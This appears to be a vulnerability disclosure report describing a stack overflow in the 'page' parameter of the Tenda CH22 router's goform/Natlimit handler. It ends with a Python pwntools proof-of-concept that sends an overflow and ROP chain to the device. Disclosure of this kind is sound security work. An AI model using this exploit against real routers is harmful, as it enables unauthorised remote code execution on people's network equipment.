# A remote code execution vulnerability in the router CH22 V1.0.0.1 manufactured by Shenzhen Jixiangtengda Technology Co., Ltd.
Router firmware download link: [https://tenda.com.cn/material/show/101367](https://tenda.com.cn/material/show/101367)
Vulnerability URL: [http://192.168.100.166/goform/Natlimit](http://192.168.100.166/goform/Natlimit)

## Vulnerability Analysis.
The vulnerability occurs in the `formNatlimit` function.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/CH22RCE11.png)
![Alt text](https://github.com/xubeining/Cve_report/blob/main/CH22RCE12.png)
The program retrieves the user input parameter `"page"` but does not check its size. When the input parameter is too large, it causes a stack overflow, leading to program crashes or potential exploitation.  
Cross-referencing the function `formNatlimit` with the route `Natlimit`, line 55. The vulnerability occurs in the `fromNatlimit` function.

![Alt text](https://github.com/xubeining/Cve_report/blob/main/CH22RCE13.png)
Cross-referencing further to `sub_64EAC`, paying attention to lines 44 and 47.
![Alt text](https://github.com/xubeining/Cve_report/blob/main/CH22RCE14.png)
Yes, based on the cross-referencing, the vulnerability occurs on the page path `goform/Natlimit`.

payload:
```
import requests
from pwn import *

addr=0x006B32C
libc=ELF("./lib/libc.so.0")
system_offset = libc.symbols["system"]
base=0xf6645000
system = base + system_offset
cmd = b"RCERCERCERCERCERCERCERCERCERCERCERCERCERCERCE\x00"
puts = base+libc.sym['puts']

move_r0=base+0x00040cb8
r3_pop=base+0x00018298

url = "http://192.168.100.166/goform/Natlimit"
payload = {
      'page':cyclic(255)+p32(r3_pop)+p32(puts)+p32(move_r0)+cmd

    }
res = requests.post(url=url,data=payload)
```
